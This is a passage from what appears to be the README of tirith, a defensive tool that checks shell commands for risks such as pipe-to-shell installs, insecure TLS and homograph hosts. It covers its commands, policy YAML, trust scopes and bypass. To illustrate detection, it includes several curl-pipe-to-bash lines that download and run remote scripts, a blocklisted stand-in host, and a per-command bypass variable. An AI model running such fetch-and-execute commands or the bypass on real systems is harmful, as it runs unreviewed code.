`tirith explain --rule <id> --fix` prints that remediation on its own.

When a command is blocked or warned, `tirith check --suggest-safe-command`
additionally prints a concrete safer rewrite of the *actual* command — but only
where a transformation is genuinely safer and correct:

```bash
tirith check --suggest-safe-command -- 'curl https://example-cli.dev/i.sh | bash'
# → try: curl -fsSL -o /tmp/tirith-review.sh https://example-cli.dev/i.sh \
#        && less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh
```

It rewrites pipe-to-shell into download-review-run, drops insecure-TLS flags
(`-k` / `--insecure` / `--no-check-certificate`), and switches plain `http://`
to `https://`. For findings with no safe mechanical rewrite (homograph
hostnames, archive-extract targets, …) it says so plainly and shows the
remediation instead — it never emits a bogus suggestion. The flag is advisory:
it changes neither the verdict nor the exit code.

### Daemon Mode (Unix)

Optional background process for sub-millisecond latency and network-aware enrichment (shortened URL resolution, DNS blocklist checks):

```bash
tirith daemon start       # tirith check auto-delegates when running
tirith daemon stop
```

> [!NOTE]
> Daemon mode is Unix-only today.

---

## Commands

| Command | What it does |
|---------|-------------|
| `tirith check -- <cmd>` | Analyze a command without executing it (`--suggest-safe-command` adds a concrete safer rewrite) |
| `tirith paste` | Check pasted content (called automatically by shell hooks) |
| `tirith scan [path]` | Scan files/directories with `--include`, `--exclude`, `--profile`, `--format sarif`, `--ci` |
| `tirith threat-db update` | Download, verify, and install the signed threat database |
| `tirith threat-db status` | Show DB age, signature status, version, and entry counts |
| `tirith threat-db explain <indicator>` | Explain what the threat DB knows about a domain, package, or IP |
| `tirith threat-db sources` | List the threat-intelligence sources the DB is built from |
| `tirith threat-db health` | Report threat DB health: install, signature, staleness, entry counts |
| `tirith threat-db diff --since <ver\|date>` | Summarize threat-DB count changes since a version or date |
| `tirith package risk <eco> <name>` | Score a package's provenance / maintainer risk (offline by default; `--path` inspects local content; `--online` adds registry-API provenance signals) |
| `tirith package explain <eco> <name>` | Show the deterministic factor-by-factor derivation of a package's risk score (`--online` adds the registry-API factors) |
| `tirith explain --rule <id>` | Show documentation, examples, and remediation for any detection rule (`--fix` shows just the remediation) |
| `tirith policy init` | Generate a starter `.tirith/policy.yaml` (`--template individual\|ci-strict\|ai-agent-heavy` for curated presets) |
| `tirith policy validate` | Validate policy YAML for syntax, schema, and conflicts |
| `tirith policy test <cmd>` | Dry-run a command or file against your policy with match trace |
| `tirith policy tune --from-audit` | Suggest conservative policy adjustments from your audit log (suggest-only — never edits the policy) |
| `tirith run <url>` | Safe `curl \| bash` replacement. Downloads, analyzes, reviews, then executes (Unix only) |
| `tirith install <npm\|pip\|cargo\|url> <args>` | Recorded install transaction: analyzes a package install's supply-chain risk, presents the verdict, checkpoints + audit-logs the transaction, then runs the real install after your go-ahead. Pre-execution risk analysis — not a sandbox. (`--online`, `--no-exec`, `--yes`) |
| `tirith score <url>` | Break down a URL's trust signals (`--explain` shows the deterministic factor-by-factor score derivation) |
| `tirith diff <url>` | Byte-level comparison showing where suspicious characters hide |
| `tirith fetch <url>` | Detect server-side cloaking (different content for bots vs browsers) (Unix only) |
| `tirith why` | Explain the last rule that triggered |
| `tirith doctor` | Diagnose installation, hooks, and policy |
| `tirith doctor --fix` | Auto-fix detected issues (hooks, policy, AI tool setup) |
| `tirith doctor --compat` | Shell/terminal compatibility report (detected shell, bash mode, install checks, co-installed hook-interacting tools) |
| `tirith verify-self` | Verify the running binary is the genuine, unmodified official release (checksum + cosign signature); reports honestly when it cannot |
| `tirith update` | Update tirith to the latest release — defers to your package manager for PM installs, atomic signature-verified self-replace for `install.sh`/standalone installs (signature mandatory by default; `--allow-unsigned`, `--rollback`, `--dry-run`) |
| `tirith version --provenance` | Show version, build info, detected install method, and verification status |
| `tirith daemon start` | Start background daemon for faster checks (Unix) |
| `tirith receipt {last,list,verify}` | Track and verify scripts run through `tirith run` |
| `tirith checkpoint {create,restore,diff}` | Snapshot files before risky operations, roll back if needed |
| `tirith setup <tool>` | One-command setup for AI coding tools (see [AI Agent Integrations](#ai-agent-integrations)) |
| `tirith gateway run` | MCP gateway proxy for intercepting AI agent shell tool calls |
| `tirith warnings` | Show accumulated session warnings, suggest trust entries. `--summary` for shell exit hooks |
| `tirith trust {add,list,explain,diff,remove,gc}` | Manage trusted patterns: narrow scope and a 30-day TTL by default, scope visualization, `trust explain`, `trust diff` |
| `tirith audit {export,stats,report}` | Audit log management for compliance |
| `tirith init` | Print the shell hook for your shell profile |
| `tirith mcp-server` | Run as MCP server over JSON-RPC stdio |
| `tirith mcp lock` | Inventory the repo's MCP servers into a deterministic `.tirith/mcp.lock` lockfile |
| `tirith mcp verify` | Gate on MCP drift — exit 1 when the current inventory no longer matches `.tirith/mcp.lock` |
| `tirith mcp diff` | Show the drift between the current MCP inventory and `.tirith/mcp.lock` (informational — exits 0 with or without drift; a usage error such as a missing lockfile still exits 2) |

---

## Design principles

- **Detection runs locally** — `paste`, `score`, `diff`, and `why` make zero
  network calls; all of their analysis is local. `tirith check` (including the
  `--approval-check` path that shell hooks use) also analyzes locally, but
  before analysis it triggers a *periodic background threat-DB refresh check*
  (see below) — so `check` is not strictly offline. Pass `tirith check
  --offline` (or set `TIRITH_OFFLINE=1`) to suppress that refresh and keep
  `check` fully local.
- **Periodic background threat-DB refresh** — `tirith check` and the shell hooks
  trigger a cheap background check, at most once every 24 hours by default
  (`threat_intel.auto_update_hours`), to keep the signed threat database fresh.
  The check is detached and does not block the command; set
  `auto_update_hours: 0` in policy to disable it entirely, or pass
  `tirith check --offline` / set `TIRITH_OFFLINE=1` to suppress it per
  invocation. `tirith paste` does **not** trigger this — it goes straight
  through the local engine.
- **No command rewriting** — tirith never modifies what you typed.
- **No telemetry** — no analytics, no crash reporting, no phone-home behavior.
- **No long-lived background processes by default** — tirith is invoked
  per-command and exits immediately. The threat-DB refresh above is a
  short-lived detached update, not a resident process. Optional `tirith daemon
  start` is the only resident process, and it is opt-in.
- **Network only when you ask, configure it, or for the threat-DB refresh** —
  `run`, `fetch`, and `audit report --upload` reach the network on explicit
  invocation. The periodic threat-DB refresh check reaches the network on the
  schedule above. Daemon mode adds network-aware URL resolution. Optional
  webhook and policy-server integrations can also make outbound requests when
  configured. Core detection itself does not phone home.

---

## Configuration

### Quick start

```bash
tirith policy init          # creates .tirith/policy.yaml in your repo
tirith policy validate      # check for syntax/schema errors
tirith policy test "curl https://example.com | bash"  # dry-run against policy
```

`tirith policy init` accepts `--template <name>` for a curated starter policy:

```bash
tirith policy init --template individual      # solo developer defaults
tirith policy init --template ci-strict       # fail-closed, no bypass, scan fail-on
tirith policy init --template ai-agent-heavy  # tuned for heavy AI-agent use
```

Each template is a well-commented, schema-valid policy you can edit further.
With no `--template`, `tirith policy init` writes the full default policy.

### Policy file

Tirith uses a YAML policy file. Discovery order:
1. `.tirith/policy.yaml` in current directory (walks up to repo root)
2. `~/.config/tirith/policy.yaml`

```yaml
fail_mode: open        # or "closed" for strict environments
paranoia: 1            # 1-4: higher = more sensitive
strict_warn: false     # require explicit acknowledgement for warnings

allowlist:
  - "get.docker.com"
  - "sh.rustup.rs"

blocklist:
  - "evil.example.com"

severity_overrides:
  docker_untrusted_registry: CRITICAL

scan:
  ignore_patterns:
    - "node_modules"
    - "target"
  profiles:
    ci:
      include: ["*.md", "*.json", "*.yaml", ".claude/*"]
      fail_on: high
```

Use `allowlist_rules` for rule-scoped suppressions when you trust a source for one rule but do not want to globally allowlist it:

```yaml
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - "get.docker.com"
```

### Managing trust from the CLI

`tirith trust` manages trusted patterns without hand-editing policy YAML. Trust
is **narrow and expiring by default**: trust the most specific thing that
works, and entries expire after 30 days unless you opt out.

```bash
# Narrowest scope — a specific URL or path is accepted as-is, 30-day TTL.
tirith trust add raw.githubusercontent.com/org/repo/main/get.sh

# A whole domain / wildcard / bare TLD is broad — it must be opted into.
tirith trust add get.docker.com --broad --rule curl_pipe_shell

# Opt out of the default TTL, and record why the entry exists.
tirith trust add example.com --broad --permanent --reason "internal mirror, OPS-42"

tirith trust list                 # scope class per entry; '!' marks broad ones
tirith trust explain example.com  # what it covers, when it expires, why added
tirith trust diff                 # what changed in the trust set
tirith trust gc --expired         # drop expired entries
```

Each entry's **scope** is classified as `exact`, `substring`, `domain`,
`wildcard`, or `bare-TLD`. A broad scope (`domain` / `wildcard` / `bare-TLD`)
requires `--broad`, so a sweeping allow is always a deliberate choice. All
subcommands support `--format json`. Trust stores written by older versions of
tirith keep working unchanged — an entry with no TTL is treated as permanent.

### Escalation and action overrides

Warnings are tracked per session. If the same rule fires repeatedly, escalation rules can upgrade to a block:

```yaml
action_overrides:
  shortened_url: block            # always block, regardless of default severity

escalation:
  - trigger: repeat_count
    rule_ids: ["*"]               # any rule
    threshold: 5
    window_minutes: 60
    action: block
  - trigger: multi_medium
    min_findings: 3               # 3+ medium findings on one command → block
    action: block
```

Review accumulated warnings at any time:

```bash
tirith warnings               # table of session warnings
tirith warnings --format json # structured output
tirith warnings --clear       # clear after viewing
```

On shell exit, a one-line summary is printed if any warnings were recorded during the session.

More examples in [docs/cookbook.md](docs/cookbook.md).

### Strict warn mode

With `strict_warn: true` (or `--strict-warn` on the CLI), medium-risk findings prompt for explicit acknowledgement in interactive terminals instead of silently warning:

```
$ curl -sSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
tirith: proceed with 1 warning(s)? [y/N]
```

Shell hooks use exit code 3 for the warn-ack protocol. Old hooks that don't know about exit code 3 fall through to fail-open behavior.

> [!NOTE]
> Exit code 3 is the warn-ack hook protocol path, not the normal direct-CLI contract. Non-hook callers should not normally see exit code 3; if they do, it indicates acknowledgement is required.

### Bypass

For the rare case you know exactly what you're doing:

```bash
TIRITH=0 curl -L https://something.xyz | bash
```

This is a standard shell per-command prefix — the variable only exists for that single command and does not persist in your session. Organizations can disable this entirely: `allow_bypass_env: false` in policy.

> [!CAUTION]
> `TIRITH=0` is per-command. Do not export it in shell profiles, dotfiles, or CI config — a permanent bypass defeats the entire protection model. If you find yourself reaching for it often, add the trusted source to `allowlist` in your policy file instead.

---

## Data handling

Local JSONL audit log at `~/.local/share/tirith/log.jsonl`:
- Timestamp, session ID, action, rule IDs, redacted command preview
- Raw detection data (`raw_action`, `raw_rule_ids`) preserved alongside enforced action for coverage auditing
- Session warning state at `~/.local/state/tirith/sessions/`
- **No** full commands, environment variables, or file contents

Disable: `export TIRITH_LOG=0`

---

## Docs

- [Threat model](docs/threat-model.md) — what tirith defends against and what it doesn't
- [Cookbook](docs/cookbook.md) — policy examples for common setups
- [Troubleshooting](docs/troubleshooting.md) — shell quirks, latency, false positives
- [Compatibility](docs/compatibility.md) — stable vs experimental surface
- [Security policy](SECURITY.md) — vulnerability reporting
- [Uninstall](docs/uninstall.md) — clean removal per shell and package manager

## License

**Core security coverage ships in the open-source tree.** All 110+ detection rules and the MCP server are available from source. The repository still contains legacy licensing and policy-server code paths, so avoid assuming that every runtime path is already tier-free.

tirith is dual-licensed:

- **AGPL-3.0-only**: [LICENSE-AGPL](LICENSE-AGPL) — free under copyleft terms
- **Commercial**: [LICENSE-COMMERCIAL](LICENSE-COMMERCIAL) — if AGPL copyleft obligations don't work for your use case, contact contact@tirith.sh for alternative licensing

Third-party data attributions in [NOTICE](NOTICE).

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=sheeki03/tirith&type=Date)](https://star-history.com/#sheeki03/tirith&Date)
